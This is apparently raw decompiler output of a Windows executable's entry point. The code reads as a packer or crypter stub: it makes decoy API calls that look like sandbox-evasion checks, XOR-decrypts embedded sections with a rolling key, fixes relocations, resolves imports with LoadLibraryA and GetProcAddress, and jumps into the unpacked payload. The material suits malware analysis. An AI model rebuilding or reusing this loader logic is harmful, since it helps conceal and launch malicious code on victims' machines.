__size32 global8 = 0x978b5050;// 4 bytes
void global10;
void global12;
void global14;
void global16;
void global18;
__size32 global27 = 0x5376816e;// 4 bytes

// address: 0x401000
void _start(unsigned int param1, int param2, unsigned int param3) {
    unsigned char cl; 		// r9
    unsigned char cl_1; 		// r9{88}
    unsigned char dl; 		// r10
    unsigned char dl_1; 		// r10{105}
    unsigned char dl_2; 		// r10{175}
    __size32 eax; 		// r24
    unsigned int eax_1; 		// r24{376}
    union { unsigned int x9; void * x10; } eax_2; 		// r24{470}
    unsigned int eax_3; 		// r24{278}
    int ebp; 		// r29
    union { unsigned int x9; unsigned short * x10; } ebp_1; 		// r29{475}
    unsigned int ebx; 		// r27
    unsigned int ebx_1; 		// r27{15}
    unsigned int ebx_10; 		// r27{436}
    unsigned int ebx_11; 		// r27{422}
    unsigned int ebx_12; 		// r27{413}
    union { unsigned int x7; union { unsigned int x9; void * x10; } * x8; } ebx_13; 		// r27{486}
    union { unsigned int x7; union { unsigned int x9; void * x10; } * x8; } ebx_14; 		// r27{473}
    union { unsigned int x7; union { unsigned int x9; void * x10; } * x8; } ebx_15; 		// r27{493}
    union { unsigned int x7; union { unsigned int x9; void * x10; } * x8; } ebx_16; 		// r27{458}
    union { unsigned int x7; void * x8; } ebx_17; 		// r27{507}
    unsigned int ebx_2; 		// r27{58}
    unsigned int ebx_3; 		// r27{221}
    union { unsigned int x7; __size32 * x8; } ebx_4; 		// r27{266}
    unsigned int ebx_5; 		// r27{246}
    union { unsigned int x7; union { int x9; void * x10; } * x8; } ebx_6; 		// r27{344}
    union { unsigned int x7; void * x8; } ebx_7; 		// r27{318}
    union { unsigned int x7; __size32 * x8; } ebx_8; 		// r27{342}
    unsigned int ebx_9; 		// r27{373}
    int ecx; 		// r25
    __size32 *ecx_1; 		// r25
    union { unsigned int x9; void * x10; } edi; 		// r31
    int edx; 		// r26
    unsigned short *edx_1; 		// r26
    __size32 esi; 		// r30
    __size32 esi_1; 		// r30{8}
    __size32 esi_10; 		// r30{154}
    __size32 esi_11; 		// r30{162}
    __size32 esi_12; 		// r30{171}
    __size32 esi_13; 		// r30{404}
    union { unsigned int x7; __size32 * x8; } esi_14; 		// r30{204}
    union { unsigned int x7; __size32 * x8; } esi_15; 		// r30{291}
    union { unsigned int x7; __size32 * x8; } esi_16; 		// r30{297}
    union { unsigned int x7; __size32 * x8; } esi_17; 		// r30{337}
    __size32 esi_18; 		// r30{384}
    __size32 esi_19; 		// r30{186}
    __size32 esi_2; 		// r30{86}
    __size32 esi_20; 		// r30{388}
    __size32 esi_21; 		// r30{392}
    __size32 esi_22; 		// r30{396}
    __size32 esi_23; 		// r30{400}
    union { unsigned int x7; __size32 * x8; } esi_24; 		// r30{496}
    union { unsigned int x7; __size32 * x8; } esi_25; 		// r30{476}
    union { unsigned int x7; __size32 * x8; } esi_26; 		// r30{461}
    union { unsigned int x7; __size32 * x8; } esi_27; 		// r30{510}
    __size32 esi_3; 		// r30{94}
    __size32 esi_4; 		// r30{103}
    __size32 esi_5; 		// r30{111}
    __size32 esi_6; 		// r30{120}
    __size32 esi_7; 		// r30{128}
    __size32 esi_8; 		// r30{137}
    __size32 esi_9; 		// r30{145}
    int esp; 		// r28
    unsigned int local0; 		// m[esp - 52]
    __size32 *local1; 		// m[esp - 52]
    unsigned int local12; 		// m[esp - 44]
    union { int x7; __size32 * x8; } local19; 		// m[esp - 52]{541}
    unsigned int local2; 		// m[esp - 88]
    unsigned int local20; 		// m[esp - 52]{524}
    unsigned int local21; 		// m[esp - 88]{544}
    unsigned int local22; 		// ebx_9{373}
    __size32 local23; 		// esi_19{379}
    __size32 local24; 		// esi_18{384}
    __size32 local25; 		// esi_20{388}
    __size32 local26; 		// esi_21{392}
    __size32 local27; 		// esi_22{396}
    __size32 local28; 		// esi_23{400}
    __size32 local29; 		// esi_13{404}
    unsigned int local30; 		// ebx_12{413}
    int local31; 		// param2{414}
    unsigned int local32; 		// ebx_11{422}
    unsigned int local33; 		// ebx_10{436}
    int local34; 		// ebp{437}
    int local35; 		// param2{448}
    union { unsigned int x7; union { unsigned int x9; void * x10; } * x8; } local36; 		// ebx_16{458}
    union { unsigned int x9; void * x10; } local37; 		// ebp{460}
    union { unsigned int x7; __size32 * x8; } local38; 		// esi_26{461}
    union { unsigned int x7; __size32 * x8; } local39; 		// local0{527}
    union { void * x1; unsigned int x2; } local4; 		// m[esp - 84]
    unsigned int local40; 		// param1{530}
    union { unsigned int x7; union { unsigned int x9; void * x10; } * x8; } local41; 		// ebx_14{473}
    union { unsigned int x7; __size32 * x8; } local42; 		// esi_25{476}
    union { unsigned int x7; union { unsigned int x9; void * x10; } * x8; } local43; 		// ebx_13{486}
    union { unsigned int x7; union { unsigned int x9; void * x10; } * x8; } local44; 		// ebx_15{493}
    union { unsigned int x7; __size32 * x8; } local45; 		// esi_24{496}
    unsigned int local46; 		// local2{539}
    union { unsigned int x7; void * x8; } local47; 		// ebx_17{507}
    union { unsigned int x9; void * x10; } local48; 		// ebp{509}
    union { unsigned int x7; __size32 * x8; } local49; 		// esi_27{510}

    esi_1 = 0;
    ebx_1 = 23;
    eax = StrStrIA();
    local22 = ebx_1;
    local23 = esi_1;
    local31 = param2;
    local35 = param2;
    local40 = param1;
    if (eax == 0) {
        eax = AddUsersToEncryptedFile();
        if (eax != 0) {
            eax = AreAllAccessesGranted();
            if (eax == 0) {
                ebx_2 = eax + 25;
                local22 = ebx_2;
            }
            ebx_9 = local22;
            ecx = VirtualProtect(); /* Warning: also results in edx */
            local30 = ebx_9;
            eax = 0;
            do {
                eax_1 = eax;
                esi_19 = local23;
                local24 = esi_19;
                if (esi_19 == ebx_9) {
                    esi_2 = 0;
                    local24 = esi_2;
                }
                esi_18 = local24;
                cl_1 = *(esi_18 + 0x404000);
                cl = (cl_1 ^ global8[eax_1]);
                esi_3 = esi_18 + 1;
                global8[eax_1] = cl ^ -86;
                local25 = esi_3;
                if (esi_18 + 1 == ebx_9) {
                    esi_4 = 0;
                    local25 = esi_4;
                }
                esi_20 = local25;
                dl_1 = *(esi_20 + 0x404000);
                dl = (dl_1 ^ global10[eax_1]);
                esi_5 = esi_20 + 1;
                global10[eax_1] = dl ^ -86;
                local26 = esi_5;
                if (esi_20 + 1 == ebx_9) {
                    esi_6 = 0;
                    local26 = esi_6;
                }
                esi_21 = local26;
                cl = *(esi_21 + 0x404000);
                cl = (cl ^ global12[eax_1]);
                esi_7 = esi_21 + 1;
                global12[eax_1] = cl ^ -86;
                local27 = esi_7;
                if (esi_21 + 1 == ebx_9) {
                    esi_8 = 0;
                    local27 = esi_8;
                }
                esi_22 = local27;
                dl = *(esi_22 + 0x404000);
                dl = (dl ^ global14[eax_1]);
                esi_9 = esi_22 + 1;
                global14[eax_1] = dl ^ -86;
                local28 = esi_9;
                if (esi_22 + 1 == ebx_9) {
                    esi_10 = 0;
                    local28 = esi_10;
                }
                esi_23 = local28;
                cl = *(esi_23 + 0x404000);
                cl = (cl ^ global16[eax_1]);
                esi_11 = esi_23 + 1;
                ecx = ((((((((ecx >> 8 & 0xffffff | (cl_1)) >> 8 & 0xffffff | (cl)) >> 8 & 0xffffff | (cl ^ -86)) >> 8 & 0xffffff | (cl)) >> 8 & 0xffffff | (cl)) >> 8 & 0xffffff | (cl ^ -86)) >> 8 & 0xffffff | (cl)) >> 8 & 0xffffff | (cl)) >> 8 & 0xffffff | (cl ^ -86);
                global16[eax_1] = cl ^ -86;
                local29 = esi_11;
                if (esi_23 + 1 == ebx_9) {
                    esi_12 = 0;
                    local29 = esi_12;
                }
                esi_13 = local29;
                dl = *(esi_13 + 0x404000);
                dl_2 = (dl ^ global18[eax_1]);
                eax = eax_1 + 1;
                dl = dl_2 ^ -86;
                edx = ((((((((edx >> 8 & 0xffffff | (dl_1)) >> 8 & 0xffffff | (dl)) >> 8 & 0xffffff | (dl ^ -86)) >> 8 & 0xffffff | (dl)) >> 8 & 0xffffff | (dl)) >> 8 & 0xffffff | (dl ^ -86)) >> 8 & 0xffffff | (dl)) >> 8 & 0xffffff | (dl_2)) >> 8 & 0xffffff | (dl_2 ^ -86);
                global18[eax_1] = dl_2 ^ -86;
                esi_19 = esi_13 + 1;
                local23 = esi_19;
            } while ((eax_1 + 1) * 6 < 0x1440);
            edi = 0x4013f8;
            ecx_1 = 0x402978;
            eax = esi_13 + (eax_1 + 1) * 48 + 1;
            esi_14 = 0xf04013f8;
            local0 = 0;
            local38 = esi_14;
            local49 = esi_14;
            if (param3 > 0) {
                do {
                    ebx_12 = local30;
                    param2 = local31;
                    local20 = local0;
                    eax = *(ecx_1 + 4);
                    edx_1 = ecx_1 + 8;
                    local33 = ebx_12;
                    local34 = param2;
                    if ((int)((eax - 8) / 2) > 0) {
                        ebx_3 = (eax - 8) / 2;
                        local32 = ebx_3;
                        do {
                            ebx_11 = local32;
                            eax = *(unsigned short*)edx_1;
                            ebp = eax & 0xf000;
                            local34 = ebp;
                            if ((eax & 0xf000) == 0x3000) {
                                eax = (eax & 0xfff) + *ecx_1;
                                *(__size32*)(eax + 0x4013f8) = *(eax + 0x4013f8) - 0xfbfec08;
                            }
                            edx_1++;
                            ebx_5 = ebx_11 - 1;
                            local32 = ebx_5;
                            local33 = ebx_5;
                        } while (ebx_11 != 1);
                    }
                    ebx_10 = local33;
                    ebp = local34;
                    eax = *(ecx_1 + 4);
                    edx = local20 + eax;
                    dl = (unsigned char) local20 + eax;
                    ecx_1 += eax;
                    local0 = local20 + eax;
                    local30 = ebx_10;
                    local31 = ebp;
                    local35 = ebp;
                } while (local20 + eax < param3);
            }
            param2 = local35;
            flags = SUBFLAGS32(*0x40217c, 0, global27);
            ebx_4 = 0x40216c;
            local1 = 0x40216c;
            local36 = ebx_4;
            local37 = param2;
            local39 = local1;
            local47 = ebx_4;
            local48 = param2;
            if (*0x40217c != 0) {
                do {
                    ebx_16 = local36;
                    ebp = local37;
                    esi_26 = local38;
                    local0 = local39;
                    param1 = local40;
                    eax = *(ebx_16 + 12);
                    eax_3 = LoadLibraryA(eax + edi); /* Warning: also results in edx */
                    local41 = ebx_16;
                    local44 = ebx_16;
                    local44 = ebx_16;
                    local45 = esi_26;
                    local46 = param1;
                    local46 = param1;
                    eax = eax_3 * 5;
                    if (eax_3 != 0) {
                        ebp = *ebx_16;
                        if (ebp == 0) {
                            ebp = *(ebx_16 + 16);
                        }
                        esi_15 = *(ebx_16 + 16);
                        eax = *(ebp + edi);
                        ebp += edi;
                        esi_16 = esi_15 + edi;
                        local42 = esi_16;
                        local45 = esi_16;
                        if (eax != 0) {
L9:
                            eax_2 = eax;
                            ebx_14 = local41;
                            ebp_1 = ebp;
                            esi_25 = local42;
                            local43 = ebx_14;
                            if (eax_2 >= 0) {
                                eax = GetProcAddress(eax_3, eax_2 + edi + 2); /* Warning: also results in edx */
                                goto L5;
                            }
                            edx = *(unsigned short*)ebp_1;
                            dl = (unsigned char) edx;
                            eax = GetProcAddress(eax_3, edx); /* Warning: also results in edx */
                            ebx_7 = ebx_14 + esi_25;
                            local43 = ebx_7;
L5:
                            ebx_13 = local43;
                            *(__size32*)esi_25 = eax;
                            ebp = ebp_1 + 4;
                            eax = *(ebp_1 + 4);
                            edi = 0x4013f8;
                            esi_17 = esi_25 + 4;
                            local41 = ebx_13;
                            local42 = esi_17;
                            local45 = esi_17;
                            local46 = local2;
                            if (eax != 0) {
                                goto L9;
                            }
                            ebx_8 = local0;
                            local44 = ebx_8;
                        }
                    }
                    ebx_15 = local44;
                    esi_24 = local45;
                    local2 = local46;
                    ebx_6 = ebx_15 + 20;
                    tmp1 = *(ebx_15 + 36);
                    flags = SUBFLAGS32(*(ebx_15 + 36), 0, tmp1);
                    local0 = ebx_15 + 20;
                    local36 = ebx_6;
                    local37 = ebp;
                    local38 = esi_24;
                    local39 = local0;
                    local40 = local2;
                    local47 = ebx_6;
                    local48 = ebp;
                    local49 = esi_24;
                } while (*(ebx_15 + 36) != 0);
            }
            ebx_17 = local47;
            ebp = local48;
            esi_27 = local49;
            (*0x401e58)(local21, local4, pc, 0x401000, 0x3000, 64, esp - 40, param3, param2, local19, 0x4013f8, local12, 0, 0x403028, 0, esi, ebx, 232, 88, dl, eax, 0x401e58, edx, ebx_17, ebp, esi_27, edi, flags, ZF, CF);
            *(__size32*)(esp - 4) = 0;
            ExitProcess(*(esp - 4));
        }
    } else {
    }
    return;
}

